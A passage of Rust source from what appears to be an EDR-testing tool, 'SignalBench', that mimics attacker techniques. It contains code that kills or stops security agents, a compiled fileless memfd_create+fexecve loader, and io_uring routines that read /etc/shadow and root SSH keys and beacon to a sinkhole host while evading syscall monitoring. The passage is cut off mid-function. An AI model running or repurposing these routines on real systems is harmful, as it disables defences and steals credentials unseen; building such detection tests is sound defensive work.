                                "  [!] pkill -f {target} succeeded -- agent may have been terminated"
                            );
                        } else {
                            info!("  [OK] pkill -f {target} exit={ec} (no matching process)");
                        }
                    }
                    Err(e) => {
                        let _ = writeln!(log, "  pkill -f {target}        -> spawn error: {e}");
                        info!("  pkill spawn error for {target}: {e}");
                    }
                }

                // 2. systemctl stop
                attempts += 1;
                match Command::new("systemctl")
                    .args(["stop", target])
                    .output()
                    .await
                {
                    Ok(o) => {
                        let ec = o.status.code().unwrap_or(-1);
                        let _ = writeln!(log, "  systemctl stop {target}  -> exit {ec}");
                        if o.status.success() {
                            successes += 1;
                            warn!(
                                "  [!] systemctl stop {target} succeeded -- service may have been stopped"
                            );
                        } else {
                            info!(
                                "  [OK] systemctl stop {target} exit={ec} (no such unit / not running)"
                            );
                        }
                    }
                    Err(e) => {
                        let _ = writeln!(log, "  systemctl stop {target}  -> spawn error: {e}");
                        info!("  systemctl spawn error for {target}: {e}");
                    }
                }

                // 3. kill -9 $(pgrep <target>) -- guarded: only run if pgrep
                //    actually returned at least one PID.  Avoids `kill -9` with
                //    an empty argument list (which would error).
                attempts += 1;
                match Command::new("pgrep").arg(target).output().await {
                    Ok(o) if o.status.success() && !o.stdout.is_empty() => {
                        let pids: Vec<String> = String::from_utf8_lossy(&o.stdout)
                            .lines()
                            .map(|l| l.trim().to_string())
                            .filter(|l| !l.is_empty() && l.chars().all(|c| c.is_ascii_digit()))
                            .collect();
                        if pids.is_empty() {
                            let _ = writeln!(log, "  pgrep {target}           -> stdout but no PIDs");
                            info!("  [OK] pgrep {target}: no usable PIDs");
                            continue;
                        }
                        let mut args = vec!["-9".to_string()];
                        args.extend(pids.iter().cloned());
                        match Command::new("kill").args(&args).output().await {
                            Ok(ko) => {
                                let ec = ko.status.code().unwrap_or(-1);
                                let _ = writeln!(
                                    log,
                                    "  kill -9 {}      -> exit {ec}",
                                    pids.join(" ")
                                );
                                if ko.status.success() {
                                    successes += 1;
                                    warn!(
                                        "  [!] kill -9 {} succeeded -- process(es) for {target} terminated",
                                        pids.join(" ")
                                    );
                                } else {
                                    info!("  [OK] kill -9 {target} exit={ec}");
                                }
                            }
                            Err(e) => {
                                let _ = writeln!(log, "  kill -9 spawn error: {e}");
                                info!("  kill -9 spawn error for {target}: {e}");
                            }
                        }
                    }
                    Ok(_) => {
                        let _ = writeln!(log, "  pgrep {target}           -> no match (skip kill -9)");
                        info!("  [OK] pgrep {target}: no match, kill -9 skipped");
                    }
                    Err(e) => {
                        let _ = writeln!(log, "  pgrep {target}           -> spawn error: {e}");
                        info!("  pgrep spawn error for {target}: {e}");
                    }
                }
            }

            let summary = format!(
                "T1562.001 complete: {} attempts across {} target names, {} succeeded.  \
                 Log: {log_path}",
                attempts,
                targets.len(),
                successes,
            );
            info!("{summary}");
            let _ = writeln!(log, "\n{summary}");

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: summary,
                artifacts: vec![log_path],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            // The technique has no persistent system-state side effects -- if it
            // succeeded in stopping a real EDR agent, that agent will be brought
            // back up by its supervisor (systemd) or by the operator.  All we
            // own is the log file.
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("[T1562.001] Removed log file: {artifact}"),
                        Err(e) => warn!("[T1562.001] Failed to remove {artifact}: {e}"),
                    }
                }
            }
            info!("[T1562.001] Cleanup complete (no system-state to revert)");
            Ok(())
        })
    }
}

// ---------------------------------------------------------------------------
// T1620 -- Reflective Code Loading via memfd_create + fexecve
// ---------------------------------------------------------------------------
//
// Canonical 2025-2026 fileless ELF execution pattern used by BPFDoor,
// Symbiote, and virtually every modern Linux implant.  Runs an ELF entirely
// from anonymous memory, bypassing file-based detection (YARA, AV signature
// scans, inotify watches on disk-write paths).
//
// The technique writes a small C loader to /tmp, compiles it with gcc, then
// runs it.  The loader:
//   1. opens /bin/true (always present on Linux)
//   2. creates an anonymous in-memory fd via
//        syscall(SYS_memfd_create, "", MFD_CLOEXEC)
//      An empty name string is the strongest fingerprint EDR rules key on --
//      benign uses of memfd_create almost always pass a descriptive name.
//   3. copies the ELF bytes from /bin/true into the memfd
//   4. fexecve(fd, argv, envp) to execute the in-memory ELF
//
// The detection signal is the memfd_create("", MFD_CLOEXEC) + fexecve
// syscall pair from a process whose backing file is not in /usr/bin or
// /usr/sbin.  The payload itself is benign (/bin/true) -- this technique
// is a faithful telemetry generator, not a functional implant.
//

pub struct ReflectiveCodeLoading {}

#[async_trait]
impl AttackTechnique for ReflectiveCodeLoading {
    // Compiles a loader.c then memfd_create+fexecve's it; gcc compile failure or
    // absence returns Err (no fallback), so skip cleanly when gcc is missing.
    fn required_tools(&self) -> Vec<&'static str> {
        vec!["gcc"]
    }

    fn info(&self) -> Technique {
        Technique {
            id: "T1620".to_string(),
            name: "Reflective Code Loading (memfd_create)".to_string(),
            description: "Compiles a small C loader to /tmp and runs it.  The \
                          loader uses syscall(SYS_memfd_create, \"\", MFD_CLOEXEC) \
                          and fexecve() to execute a benign payload (/bin/true) \
                          purely from anonymous memory, bypassing every file- \
                          based detection layer.  This is the canonical 2025-2026 \
                          fileless ELF execution pattern -- used by BPFDoor \
                          variants, Symbiote, and virtually every modern Linux \
                          implant.  The detection signal is the syscall pair \
                          itself, not the payload, so this technique is a \
                          faithful telemetry generator while doing nothing more \
                          harmful than running /bin/true in memory.  Fully \
                          reversible: cleanup removes the C source, the compiled \
                          loader binary and the session directory under /tmp."
                .to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "payload_path".to_string(),
                    description: "Path to the on-disk ELF whose bytes will be \
                                  loaded into the memfd and fexecve'd.  Must be \
                                  an executable the loader has read access to.  \
                                  Default: /bin/true".to_string(),
                    required: false,
                    default: Some("/bin/true".to_string()),
                },
            ],
            detection: "Monitor for: memfd_create() syscalls with an empty name \
                        argument (benign use almost always supplies a descriptive \
                        name); fexecve() from a process whose executable backing \
                        is /memfd:... rather than an on-disk path; process exec \
                        events where /proc/[pid]/exe resolves to \
                        /memfd:<anything> (deleted); gcc invocations that \
                        produce binaries under /tmp followed immediately by \
                        execution of those binaries.  Detection rules from \
                        Elastic, Falco and Sysdig all cover the memfd_create + \
                        fexecve pair natively.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec![],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use tokio::process::Command;

            let session_id = Uuid::new_v4().to_string().replace('-', "");
            let work_dir = format!("/tmp/signalbench_t1620_{session_id}");
            let src_path = format!("{work_dir}/loader.c");
            let bin_path = format!("{work_dir}/loader");

            let default_payload = "/bin/true".to_string();
            let payload_path = config
                .parameters
                .get("payload_path")
                .unwrap_or(&default_payload)
                .clone();

            if dry_run {
                info!("[DRY RUN] T1620 would:");
                info!("[DRY RUN]   1. mkdir {work_dir}");
                info!("[DRY RUN]   2. write loader.c (memfd_create + fexecve pattern)");
                info!("[DRY RUN]   3. gcc -o loader loader.c");
                info!(
                    "[DRY RUN]   4. execute ./loader, which loads {payload_path} into memfd and runs it"
                );
                info!("[DRY RUN]   5. cleanup removes {work_dir} entirely");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!(
                        "DRY RUN: would compile + run a memfd_create+fexecve loader against {payload_path}"
                    ),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            info!("Starting T1620 -- Reflective Code Loading (session {session_id})");

            // Phase 1: prepare the working directory.
            if let Err(e) = fs::create_dir_all(&work_dir) {
                return Err(format!("Failed to create work dir {work_dir}: {e}"));
            }

            // Phase 2: write the C source.
            //
            // The loader uses the raw syscall for memfd_create because libc's
            // memfd_create wrapper is glibc-only and gates on _GNU_SOURCE.
            // SYS_memfd_create is exported from <sys/syscall.h> on every
            // mainstream Linux libc, so the source builds on any arch glibc
            // (or musl) supports.
            let loader_src = format!(
                r#"// SignalBench T1620 reflective-code-loading PoC.
// Loads {payload_path} into an anonymous memfd and fexecve's it.
// Detection signal: memfd_create("", MFD_CLOEXEC) + fexecve syscall pair.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

int main(int argc, char **argv, char **envp) {{
    (void)argc; (void)argv;

    const char *src_path = "{payload_path}";
    int src = open(src_path, O_RDONLY);
    if (src < 0) {{
        perror("open payload");
        return 10;
    }}

    // Empty name is the fingerprint EDR rules key on -- benign uses
    // almost always pass a descriptive name.
    int fd = (int)syscall(SYS_memfd_create, "", MFD_CLOEXEC);
    if (fd < 0) {{
        perror("memfd_create");
        close(src);
        return 11;
    }}

    char buf[4096];
    ssize_t n;
    while ((n = read(src, buf, sizeof(buf))) > 0) {{
        ssize_t w = 0;
        while (w < n) {{
            ssize_t k = write(fd, buf + w, (size_t)(n - w));
            if (k < 0) {{
                perror("write to memfd");
                close(src); close(fd);
                return 12;
            }}
            w += k;
        }}
    }}
    close(src);

    char *new_argv[] = {{ (char *)"signalbench-t1620", NULL }};
    char *new_envp[] = {{ NULL }};
    (void)envp;

    fexecve(fd, new_argv, new_envp);

    // If we reach here, fexecve failed.
    perror("fexecve");
    close(fd);
    return 13;
}}
"#
            );

            if let Err(e) = fs::write(&src_path, loader_src) {
                return Err(format!("Failed to write loader.c at {src_path}: {e}"));
            }
            info!("  [-->] Wrote loader source: {src_path}");

            // Phase 3: compile with gcc.
            info!("  [-->] Compiling loader with gcc...");
            let compile_output = Command::new("gcc")
                .args(["-O2", "-Wall", "-o", &bin_path, &src_path])
                .output()
                .await;

            match compile_output {
                Ok(o) if o.status.success() => {
                    info!("  [OK] Loader compiled at {bin_path}");
                }
                Ok(o) => {
                    let stderr = String::from_utf8_lossy(&o.stderr).to_string();
                    return Err(format!(
                        "gcc failed (exit {}): {stderr}",
                        o.status.code().unwrap_or(-1)
                    ));
                }
                Err(e) => {
                    return Err(format!(
                        "Failed to spawn gcc: {e}.  Is the gcc binary installed?"
                    ));
                }
            }

            // Phase 4: execute the loader (wrapped in timeout for safety).
            info!("  [-->] Executing loader (memfd_create + fexecve {payload_path})");
            let run_output = Command::new("timeout")
                .args(["5", &bin_path])
                .output()
                .await;

            let (run_ec, run_stderr) = match run_output {
                Ok(o) => (
                    o.status.code().unwrap_or(-1),
                    String::from_utf8_lossy(&o.stderr).to_string(),
                ),
                Err(e) => {
                    warn!("Loader spawn error: {e}");
                    (-1, e.to_string())
                }
            };

            let summary = format!(
                "T1620 Reflective Code Loading complete: loader compiled at {bin_path}, \
                 executed with exit={run_ec}, payload={payload_path}.  Work dir: {work_dir}"
            );
            info!("{summary}");
            if !run_stderr.is_empty() && run_ec != 0 {
                info!("  loader stderr: {}", run_stderr.trim());
            }

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: run_ec == 0,
                message: summary,
                artifacts: vec![src_path, bin_path, work_dir],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("[T1620] Cleaning up reflective-code-loading artefacts...");

            // Two-pass: files first, then any directories.  Lets per-file
            // logging surface any failure for a specific artefact before the
            // wholesale directory removal.
            let mut dirs: Vec<&String> = Vec::new();
            for artifact in artifacts {
                let p = Path::new(artifact);
                if !p.exists() {
                    continue;
                }
                if p.is_dir() {
                    dirs.push(artifact);
                    continue;
                }
                match fs::remove_file(artifact) {
                    Ok(_) => info!("  [OK] Removed {artifact}"),
                    Err(e) => warn!("  Failed to remove {artifact}: {e}"),
                }
            }
            for d in dirs {
                match fs::remove_dir_all(d) {
                    Ok(_) => info!("  [OK] Removed dir {d}"),
                    Err(e) => warn!("  Failed to remove dir {d}: {e}"),
                }
            }

            info!("[T1620] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1106-IOURING: io_uring Syscall-less Recon & C2 (RingReaper pattern)
// =============================================================================
// Performs real post-exploitation I/O -- local-system data reads, host recon,
// and a C2 connect+beacon -- entirely through io_uring submission/completion
// rings.  The classic syscalls an EDR hooks (openat, read, connect, recvfrom,
// statx) never fire, so a purely syscall-hooking sensor is blind to all of it.
// Recreates the technique popularised by the RingReaper agent (Aug 2025).
//
// Every host operation is read-only; the single network egress targets the
// SignalBench sinkhole.  Nothing is persisted -- fully reversible.

/// Common SUID binaries probed (read-only, via io_uring Statx) for the setuid
/// bit -- the privesc-recon step of the RingReaper pattern.
const T1106_SUID_CANDIDATES: &[&str] = &[
    "/usr/bin/sudo",
    "/usr/bin/passwd",
    "/usr/bin/mount",
    "/usr/bin/umount",
    "/usr/bin/su",
    "/usr/bin/chsh",
    "/usr/bin/chfn",
    "/usr/bin/newgrp",
    "/usr/bin/pkexec",
    "/bin/ping",
];

/// One-line C2 beacon sent to the sinkhole over io_uring (IORING_OP_SEND).
/// Shaped as a minimal HTTP/1.0 request so the sinkhole's HTTP handler logs it,
/// giving server-side confirmation that the io_uring connect/send completed.
const T1106_BEACON: &[u8] = b"GET /t1106-iouring HTTP/1.0\r\nHost: signalbench-iouring.sigre.xyz\r\nUser-Agent: signalbench-ringreaper/1.0\r\n\r\n";

/// Second-channel beacon sent via IORING_OP_WRITE on the same sinkhole socket.
/// Distinct path so the sinkhole log can distinguish Send vs Write opcodes --
/// useful for verifying the EDR rule matches on the Write opcode, not only on
/// Send/Recv (an early-gen io_uring detection gap).
const T1106_BEACON_WRITE: &[u8] = b"GET /t1106-iouring-write HTTP/1.0\r\nHost: signalbench-iouring.sigre.xyz\r\nUser-Agent: signalbench-ringreaper/1.0 (write)\r\n\r\n";

/// Benign read-only commands spawned in Pass B.  Their stdout is piped and read
/// back through io_uring (IORING_OP_READ on the pipe fd) -- mirroring the
/// published RingReaper behaviour of using the ring to exfiltrate child-process
/// output even though the child itself is spawned with the conventional
/// fork+execve syscall pair (the kernel has no IORING_OP_EXEC at present).
const T1106_RECON_COMMANDS: &[(&str, &[&str])] = &[
    ("/usr/bin/whoami", &[]),
    ("/usr/bin/id", &[]),
    ("/bin/hostname", &[]),
    ("/bin/uname", &["-a"]),
];

// statx ABI constants, hard-coded because libc does not export `statx`,
// STATX_MODE, or AT_STATX_SYNC_AS_STAT on all targets (notably musl).  These
// are stable Linux UAPI values.  `struct statx` is a fixed 256-byte structure
// whose stx_mode field is a u16 at byte offset 28.
const T1106_STATX_BUF_LEN: usize = 256;
const T1106_STATX_MODE_OFFSET: usize = 28;
const T1106_STATX_MASK_MODE: u32 = 0x0000_0002; // STATX_MODE
const T1106_AT_STATX_SYNC_AS_STAT: i32 = 0x0000; // AT_STATX_SYNC_AS_STAT
const T1106_S_ISUID: u32 = 0o4000; // setuid bit

/// Build an io_uring ring, preferring SQPOLL mode so the kernel polls the
/// submission queue on a dedicated thread (`iou-sqp-<pid>`) and eliminates
/// per-op `io_uring_enter` syscalls entirely.  Falls back to the standard
/// (non-polling) ring on any setup error -- typically `EPERM` on kernels
/// < 5.13 without `CAP_SYS_NICE`.  Returns the established ring together with
/// a static label of the mode that was actually selected, for reporting back
/// to the operator.
///
/// We deliberately do NOT hide the SQPOLL kernel thread: its visibility in
/// `ps`/`top` is part of the coverage signal the defender is meant to see.
fn t1106_build_ring(entries: u32) -> Result<(io_uring::IoUring, &'static str), std::io::Error> {
    // SQPOLL idle interval: 2s.  Long enough that the poll thread does not
    // churn CPU between recon steps, short enough that it stays warm across
    // the technique's short lifetime.
    match io_uring::IoUring::builder().setup_sqpoll(2000).build(entries) {
        Ok(r) => Ok((r, "sqpoll")),
        Err(_) => io_uring::IoUring::new(entries).map(|r| (r, "standard")),
    }
}

/// Submit a chain of SQEs in a SINGLE `io_uring_enter` and return their raw
/// CQE results in submission order.  All but the final entry are linked with
/// `IOSQE_IO_LINK` so the kernel runs them as an ordered chain and aborts any
/// successor of a failed link (`ECANCELED`) -- which is exactly what we want
/// for sequences whose later steps make no sense if the earlier one failed
/// (e.g. C2 `Connect → Send → Recv`).
fn t1106_ring_submit_chain(
    ring: &mut io_uring::IoUring,
    entries: &[io_uring::squeue::Entry],
    label: &str,
) -> Result<Vec<i32>, String> {
    if entries.is_empty() {
        return Ok(Vec::new());
    }
    let n = entries.len();
    // SAFETY: as in `t1106_ring_submit`, every buffer / CString / sockaddr
    // referenced by an entry is kept alive by the caller across the
    // synchronous submit_and_wait below.
    {
        let mut sq = ring.submission();
        for (i, e) in entries.iter().enumerate() {
            // Link all but the last so the kernel processes them in order
            // and short-circuits successors of a failed link.
            let entry = if i + 1 < n {
                e.clone().flags(io_uring::squeue::Flags::IO_LINK)
            } else {
                e.clone()
            };
            unsafe {
                sq.push(&entry).map_err(|_| {
                    format!("{label}: submission queue full at link {i}")
                })?;
            }
        }
    }
    ring.submit_and_wait(n)
        .map_err(|e| format!("{label}: submit_and_wait({n}) failed: {e}"))?;
    let mut out = Vec::with_capacity(n);
    for cqe in ring.completion() {
        out.push(cqe.result());
    }
    Ok(out)
}

/// Pushes one prepared SQE, submits, waits for its single completion, and
/// returns the raw CQE result (>= 0 on success, negative -errno on failure).
fn t1106_ring_submit(
    ring: &mut io_uring::IoUring,
    entry: &io_uring::squeue::Entry,
    label: &str,
) -> Result<i32, String> {
    // SAFETY: every buffer / CString / sockaddr referenced by `entry` is kept
    // alive by the caller until this function returns.  We submit_and_wait
    // synchronously below, so the kernel is finished with the referenced memory
    // before the caller's backing storage can drop.
    unsafe {
        ring.submission()
            .push(entry)
            .map_err(|_| format!("{label}: submission queue full"))?;
    }
    ring.submit_and_wait(1)
        .map_err(|e| format!("{label}: submit_and_wait failed: {e}"))?;
    let cqe = ring
        .completion()
        .next()
        .ok_or_else(|| format!("{label}: no completion entry returned"))?;
    Ok(cqe.result())
}

/// Spawns `cmd` with the given `args` and reads its stdout back through the
/// io_uring ring (IORING_OP_READ on the child's pipe fd).  The spawn itself
/// still uses the conventional `fork+execve` syscalls -- the kernel exposes
/// no IORING_OP_EXEC -- but every byte of the command's output crosses the
/// io_uring channel rather than a `read(2)` syscall, matching the published
/// RingReaper behaviour of using the ring to exfiltrate child-process output.
///
/// Returns (first stdout line, total bytes read) on success.  The child is
/// always reaped before returning so no zombies are left.
fn t1106_iouring_read_command_output(
    ring: &mut io_uring::IoUring,
    cmd: &str,
    args: &[&str],
    ud: u64,
    buf: &mut [u8],
) -> Result<(String, usize), String> {
    use io_uring::{opcode, types};
    use std::os::unix::io::AsRawFd;
    use std::process::{Command, Stdio};

    let mut child = Command::new(cmd)
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("{cmd}: spawn failed: {e}"))?;

    let stdout = child
        .stdout
        .as_mut()
        .ok_or_else(|| format!("{cmd}: stdout pipe unavailable"))?;
    let fd = stdout.as_raw_fd();

    let read = opcode::Read::new(types::Fd(fd), buf.as_mut_ptr(), buf.len() as u32)
        .build()
        .user_data(ud);
    let n = t1106_ring_submit(ring, &read, &format!("ring-read {cmd} stdout"))?;

    // Reap the child regardless of read outcome.  Best-effort: if wait fails
    // we still return what we read (the kernel will reap on process exit).
    let _ = child.wait();

    if n < 0 {
        return Err(format!("{cmd}: ring read failed (errno {})", -n));
    }
    let bytes = n as usize;
    let first_line = buf[..bytes.min(buf.len())]
        .split(|b| *b == b'\n')
        .next()
        .map(|line| String::from_utf8_lossy(line).trim().to_string())
        .unwrap_or_default();
    Ok((first_line, bytes))
}

/// Reads up to `buf.len()` bytes of `path` purely via io_uring (OpenAt + Read +
/// Close).  Returns the number of bytes read into `buf`, or an error string.
fn t1106_iouring_read_file(
    ring: &mut io_uring::IoUring,
    path: &str,
    ud_base: u64,
    buf: &mut [u8],
) -> Result<usize, String> {
    use io_uring::{opcode, types};
    use std::ffi::CString;

    let cpath = CString::new(path).map_err(|e| format!("{path}: bad path: {e}"))?;
    let openat = opcode::OpenAt::new(types::Fd(libc::AT_FDCWD), cpath.as_ptr())
        .flags(libc::O_RDONLY)
        .build()
        .user_data(ud_base);
    let fd = t1106_ring_submit(ring, &openat, &format!("openat {path}"))?;
    if fd < 0 {
        return Err(format!("openat {path} failed (errno {})", -fd));
    }

    let read = opcode::Read::new(types::Fd(fd), buf.as_mut_ptr(), buf.len() as u32)
        .build()
        .user_data(ud_base + 1);
    let read_res = t1106_ring_submit(ring, &read, &format!("read {path}"));

    // Always close the fd, even if the read failed.
    let close = opcode::Close::new(types::Fd(fd))
        .build()
        .user_data(ud_base + 2);
    let _ = t1106_ring_submit(ring, &close, &format!("close {path}"));

    let n = read_res?;
    if n < 0 {
        return Err(format!("read {path} failed (errno {})", -n));
    }
    Ok(n as usize)
}

pub struct IoUringEvasion {}

#[async_trait]
impl AttackTechnique for IoUringEvasion {
    fn info(&self) -> Technique {
        Technique {
            id: "T1106-IOURING".to_string(),
            name: "io_uring Syscall-less Recon & C2 (RingReaper)".to_string(),
            description: "Recreates the io_uring EDR-evasion technique popularised \
                          by the RingReaper post-exploitation agent (Aug 2025).  \
                          Drives real post-exploitation I/O ENTIRELY through \
                          io_uring submission/completion rings -- reading sensitive \
                          files (/etc/passwd T1005; /etc/shadow + /root/.ssh/id_* \
                          when root T1003.008/T1552.004); enumerating connections \
                          (/proc/net/tcp T1049) and logged-in users (utmp T1033); \
                          statx-probing common SUID binaries for privesc recon; \
                          a chained Connect->Send->Recv C2 exchange plus a separate \
                          IORING_OP_WRITE second-channel beacon to the SignalBench \
                          sinkhole (T1106 Native API); and reading the stdout of \
                          benign recon commands (whoami/id/hostname/uname -a) back \
                          through the ring (IORING_OP_READ on the pipe fd).  \
                          Prefers SQPOLL ring mode so the kernel polls the SQ on a \
                          dedicated thread (iou-sqp-<pid>) and userspace makes ZERO \
                          io_uring_enter syscalls for in-flight ops -- falls back \
                          to standard mode if SQPOLL setup is refused (CAP_SYS_NICE \
                          missing on kernels < 5.13).  Because the work is driven \
                          by the ring rather than openat/read/connect/recvfrom/ \
                          statx/write syscalls, a sensor that only hooks syscalls \
                          sees NONE of it.  This is the current (2025) Linux EDR \
                          blind spot, so the technique doubles as a coverage test: \
                          it tells the operator whether their XDR/EDR observes \
                          io_uring at all.  Every host operation is read-only; the \
                          only egress targets the sinkhole; fully reversible -- \
                          cleanup removes the one /tmp session log.  Requires a \
                          kernel >= 5.6 with io_uring enabled (>= 5.13 for \
                          unprivileged SQPOLL)."
                .to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![TechniqueParameter {
                name: "target_file".to_string(),
                description: "Sensitive file read via io_uring OpenAt+Read (Data \
                              from Local System).  Read-only.  Default: /etc/passwd"
                    .to_string(),
                required: false,
                default: Some("/etc/passwd".to_string()),
            }],
            detection: "The detection signal is the io_uring channel itself, not a \
                        payload.  Monitor for: io_uring_setup() at process start \
                        (the SQPOLL ring spawns a kernel thread visible as \
                        'iou-sqp-<pid>' in ps/top -- a strong IoC by itself); \
                        io_uring_enter() syscalls (zero under SQPOLL, expect a \
                        small bounded count under standard mode); processes \
                        holding anonymous [io_uring] inode fds in /proc/[pid]/fd; \
                        a conspicuous ABSENCE of openat/read/connect/recvfrom/ \
                        statx/write syscalls for activity that demonstrably \
                        touched files and the network (the tell-tale gap); \
                        coverage of the IORING_OP_WRITE opcode in addition to \
                        Send/Recv (an early-gen rule gap exercised by the \
                        second-channel beacon); eBPF/KRSI-LSM, Falco and Tetragon \
                        io_uring rules.  IMPORTANT: classic syscall hooking and \
                        seccomp-syscall auditing will NOT see this technique -- if \
                        your sensor raises nothing, that is the coverage gap being \
                        measured.  Hardened hosts can neutralise it entirely via \
                        sysctl kernel.io_uring_disabled=2."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec![],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            use io_uring::{opcode, types};
            use std::ffi::CString;

            let default_target = "/etc/passwd".to_string();
            let target_file = config
                .parameters
                .get("target_file")
                .unwrap_or(&default_target)
                .clone();

            let session_id = Uuid::new_v4().to_string().replace('-', "");
            let work_dir = format!("/tmp/signalbench_t1106_{session_id}");
            let log_path = format!("{work_dir}/run.log");

            if dry_run {
                info!(
                    "[DRY RUN] T1106-IOURING would, ENTIRELY via io_uring SQEs (no openat/read/connect/recv/statx/write syscalls):"
                );
                info!("[DRY RUN]   0. Build ring preferring SQPOLL (kernel poll thread iou-sqp-<pid>); fall back to standard");
                info!("[DRY RUN]   1. OpenAt+Read+Close {target_file} (Data from Local System / T1005)");
                info!("[DRY RUN]   2. OpenAt+Read /proc/net/tcp (Network Connections Discovery / T1049)");
                info!("[DRY RUN]   3. OpenAt+Read utmp (System Owner/User Discovery / T1033)");
                info!("[DRY RUN]   3b. Root only: OpenAt+Read /etc/shadow (T1003.008) + first /root/.ssh/id_* (T1552.004)");
                info!(
                    "[DRY RUN]   4. Statx over {} common SUID binaries (privesc recon)",
                    T1106_SUID_CANDIDATES.len()
                );
                info!(
                    "[DRY RUN]   4b. Spawn {} read-only commands (whoami/id/hostname/uname -a) and read their stdout back through the ring (IORING_OP_READ on the pipe fd)",
                    T1106_RECON_COMMANDS.len()
                );
                info!("[DRY RUN]   5. Chained Connect->Send->Recv to the sinkhole + OP_WRITE second-channel beacon (C2 over io_uring / T1106 Native API)");
                info!("[DRY RUN]   cleanup removes {work_dir}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!(
                        "DRY RUN: would perform syscall-less io_uring recon ({target_file}, /proc/net/tcp, utmp, SUID statx; root-only /etc/shadow + SSH key) plus a chained C2 connect/send/recv + OP_WRITE second-channel to the sinkhole; ring mode prefers SQPOLL"
                    ),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            info!(
                "Starting T1106-IOURING -- io_uring syscall-less recon & C2 (session {session_id})"
            );

            // io_uring availability pre-check.  ENOSYS = kernel too old (< 5.6);
            // EPERM = kernel.io_uring_disabled sysctl set.  Either way we report
            // a clean, non-crashing result -- an unavailable io_uring is itself a
            // positive hardening signal for the operator.
            //
            // SQPOLL is preferred (no per-op io_uring_enter syscall); the helper
            // transparently falls back to standard mode if SQPOLL setup is
            // refused (e.g. CAP_SYS_NICE missing on kernels < 5.13).
            let (mut ring, ring_mode) = match t1106_build_ring(32) {
                Ok(pair) => pair,
                Err(e) => {
                    let reason = match e.raw_os_error() {
                        Some(libc::ENOSYS) => {
                            "io_uring not supported by this kernel (requires >= 5.6)"
                        }
                        Some(libc::EPERM) => {
                            "io_uring disabled by kernel.io_uring_disabled sysctl"
                        }
                        _ => "io_uring_setup failed",
                    };
                    let msg = format!(
                        "T1106-IOURING: {reason} ({e}).  No syscall-less io_uring channel could be established on this host -- this is a positive hardening posture."
                    );
                    warn!("{msg}");
                    return Ok(SimulationResult {
                        technique_id: self.info().id,
                        success: false,
                        message: msg,
                        artifacts: vec![],
                        cleanup_required: false,
                    });
                }
            };

            let mut report: Vec<String> = Vec::new();
            report.push(format!("SignalBench T1106-IOURING session {session_id}"));
            report.push(format!(
                "Ring mode: {ring_mode} (sqpoll = kernel polls SQ, zero io_uring_enter per op)"
            ));
            report.push(
                "All recon + C2 I/O below performed via io_uring SQEs (no equivalent syscalls)."
                    .to_string(),
            );

            let mut buf = vec![0u8; 16384];

            // Step 1: Data from Local System (T1005) -- read target_file.
            match t1106_iouring_read_file(&mut ring, &target_file, 0x10, &mut buf) {
                Ok(n) => {
                    let line = format!("[OK] T1005 io_uring read {target_file}: {n} bytes");
                    info!("  [-->] {line}");
                    report.push(line);
                }
                Err(e) => {
                    let line = format!("[--] T1005 io_uring read {target_file}: {e}");
                    warn!("  {line}");
                    report.push(line);
                }
            }

            // Step 2: System Network Connections Discovery (T1049) -- /proc/net/tcp.
            match t1106_iouring_read_file(&mut ring, "/proc/net/tcp", 0x20, &mut buf) {
                Ok(n) => {
                    let entries = buf[..n.min(buf.len())]
                        .iter()
                        .filter(|&&b| b == b'\n')
                        .count()
                        .saturating_sub(1);
                    let line = format!(
                        "[OK] T1049 io_uring read /proc/net/tcp: {n} bytes (~{entries} tcp entries)"
                    );
                    info!("  [-->] {line}");
                    report.push(line);
                }
                Err(e) => {
                    let line = format!("[--] T1049 io_uring read /proc/net/tcp: {e}");
                    warn!("  {line}");
                    report.push(line);
                }
            }

            // Step 3: System Owner/User Discovery (T1033) -- utmp (logged-in users).
            let utmp = if Path::new("/run/utmp").exists() {
                "/run/utmp"
            } else {
                "/var/run/utmp"
            };
            match t1106_iouring_read_file(&mut ring, utmp, 0x30, &mut buf) {
                Ok(n) => {
                    let line = format!("[OK] T1033 io_uring read {utmp}: {n} bytes");
                    info!("  [-->] {line}");
                    report.push(line);
                }
                Err(e) => {
                    let line = format!("[--] T1033 io_uring read {utmp}: {e}");
                    warn!("  {line}");
                    report.push(line);
                }
            }

            // Step 3b: Root-only sensitive reads -- /etc/shadow and the first
            // SSH private key under /root/.ssh.  These are the canonical files
            // RingReaper exfiltrates when it has the privileges; cleanly
            // skipped (no signal degradation) for non-root users because the
            // files are simply unreadable.  Existing read precedent in
            // T1003.008 / T1552.001.
            if crate::utils::is_root() {
                match t1106_iouring_read_file(&mut ring, "/etc/shadow", 0x34, &mut buf) {
                    Ok(n) => {
                        let line = format!(
                            "[OK] T1003.008 io_uring read /etc/shadow: {n} bytes (root-only)"
                        );
                        info!("  [-->] {line}");
                        report.push(line);
